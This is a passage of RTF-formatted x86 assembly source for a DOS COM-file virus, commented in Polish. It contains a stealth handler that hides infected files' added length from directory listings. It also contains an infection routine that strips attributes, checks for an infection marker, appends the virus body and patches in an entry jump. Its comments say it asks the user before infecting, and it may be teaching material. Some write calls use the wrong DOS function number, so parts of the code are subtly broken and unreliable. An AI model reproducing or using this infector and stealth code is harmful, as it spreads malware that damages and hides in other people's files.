\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  PrzywrocStare24                  ; przywroc stara obsluge bledow krytycznych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     retf  2                                ; powrot z zachowaniem ustawionych znacznikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_4E_4F:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     call  UstawNowe24                      ; ustaw obsluge bledow krytycznych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    STEALTH_4E_4F_Powrot2            ; CF=1 to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pushf                                  ; \\ zachowaj wartosci rejestrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  es ax bx                         ; / zmienionych przez wywolanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,2Fh                           ; funkcja DOS - wez adres do DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   es:[bx][DTADate],VZnacznik       ; czy znaleziona pozycja jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zainfekowana ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   STEALTH_4E_4F_Powrot             ; NIE - STEALTH niepotrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr es:[bx][DTASize+2],0    ; czy dlugosc pliku >65535 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   MozeMiecWirusa_4E_4F             ; TAK - moze byc zainfekowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr es:[bx][DTASize],DlugoscWirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    STEALTH_4E_4F_Powrot             ; czy dlugosc pliku >=dlug. wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; TAK - moze byc zainfekowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; NIE - STEALTH niepotrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MozeMiecWirusa_4E_4F:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   word ptr es:[bx][DTASize],DlugoscWirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odejmij dlugosc wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sbb   word ptr es:[bx][DTASize+2],0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; uwzglednij ewent. pozyczke}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; z bardziej znaczacej czesci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_4E_4F_Powrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   bx ax es                         ; \\ przywroc odpowiednie wartosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     popf                                   ; / rejestrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_4E_4F_Powrot2:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  PrzywrocStare24                  ; przywroc stara obsluge bledow krytycznych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     retf  2                                ; powrot z zachowaniem ustawionych znacznikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InfekcjaPliku:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  es ds ax bx cx dx si di          ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:StaryDS, ds                   ; \\ zachowaj adres do nazwy pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:StaryDX, dx                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     call  UstawNowe24}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4300h                         ; funkcja DOS - czytaj atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; CF=1 blad wiec powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Atrybut,cl                    ; wez stary atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zapisz atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,AtrArchive                    ; podaj nowy atrybut : Archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3D02h                         ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do odczytu i zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  ax,bx                            ; przenies uchwyt pliku do BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5700h                         ; funkcja DOS - wpisz date, czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Czas,cx                       ; zachowaj czas pliku na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   dx,VZnacznik                     ; czy plik jest juz zainfekowany ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; TAK - zamknij plik, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ; \\ DS=CS=segment wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,3                             ; ilosc czytanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,StareBajty                    ; podaj dokad czytac 3 bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Fh                           ; funkcja DOS - czytaj z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [StareBajty]         ; wez dwa pierwsze bajty pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'MZ'                          ; i sprawdz, czy to nie EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; gdy 'MZ' to plik EXE, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'ZM'                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    ZamknijPlik                      ; gdy 'ZM' to plik EXE, powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem konca pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4202h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na koniec pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; DX = starsza czesc dlugosci pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    dx,dx                            ; czy plik krotszy niz 65536 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnz   ZamknijPlik                      ; NIE - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,64000                         ; czy dlugosc <= 64000 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ja    ZamknijPlik                      ; NIE - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,3                             ; czy dlugosc >= 3 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    ZamknijPlik                      ; NIE - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   ax,3                             ; odejmij dlugosc skoku E9 ?? ??}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [Skok+1],ax             ; zapisz do bufora rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeZnalazlemPlik               ; \\       zapytaj uzytkownika}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Druk                             ;  \\      czy chce zainfekowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;   \\     plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   di,cs:StaryDX                    ;    \\    nazwa pliku jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,cs:StaryDS                    ;     \\   wyswietlana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Druk                             ;      \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;       - (dzieki temu uzytkownik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ;      /   ma pelna kontrole nad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ;     /    tym co wirus infekuje)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeInfekcja                    ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Druk                             ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Decyzja                          ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; /       CF=1 uzytkownik nie pozwala}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,DlugoscWirusa                 ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,100h                          ; podaj skad zapisac wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem poczatku pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4200h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na poczatek pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1 to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,3                             ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,Skok                          ; podaj skad zapisac rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,Czas                          ; przywroc czas}{\f2\fs24\lang1045{\*\listtag0}\par}
